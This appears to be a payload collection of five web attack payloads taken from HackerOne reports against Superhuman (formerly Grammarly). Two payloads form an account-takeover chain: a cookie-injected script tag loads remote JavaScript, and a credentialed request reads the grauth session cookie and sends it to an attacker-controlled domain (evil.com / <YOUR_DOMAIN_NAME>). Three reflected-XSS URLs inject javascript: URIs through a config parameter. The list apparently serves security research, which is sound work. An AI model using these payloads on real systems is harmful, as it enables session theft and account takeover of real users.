# Superhuman (formerly Grammarly)

5 payloads.

### `bfbf69ee`

```
<html>

<head>
<title>Grammarly POC</title>
<meta charset="utf-8"/>
<script src="https://target.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
<script>

    var cookie_hax = {
        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
    };

    for (var name in cookie_hax) {
        $.ajax({
            type: "POST",
            url: "https://evil.com/cookies?name=" + name + "&value=" + encodeURICompon
```

— [Account takeover through the combination of cookie manipulation and XSS](https://hackerone.com/reports/534450) · Superhuman (formerly Grammarly) · [k4r4koyun](https://hackerone.com/k4r4koyun)

### `3e19a74c`

```
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://target.com/cookies?name=grauth");
xhr.withCredentials = true;
xhr.onload = function () {
    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
    this.send();
};
xhr.send();
```

— [Account takeover through the combination of cookie manipulation and XSS](https://hackerone.com/reports/534450) · Superhuman (formerly Grammarly) · [k4r4koyun](https://hackerone.com/k4r4koyun)

### `407a6ff1`

```
https://target.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

**Parameter:** `config`
— [Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state](https://hackerone.com/reports/1082847) · Superhuman (formerly Grammarly) · [fransrosen](https://hackerone.com/fransrosen)

### `47747f9b`

```
https://target.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

**Parameter:** `config`
— [Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state](https://hackerone.com/reports/1082847) · Superhuman (formerly Grammarly) · [fransrosen](https://hackerone.com/fransrosen)

### `010fbe46`

```
https://target.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
```

**Parameter:** `config`
— [Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state](https://hackerone.com/reports/1082847) · Superhuman (formerly Grammarly) · [fransrosen](https://hackerone.com/fransrosen)
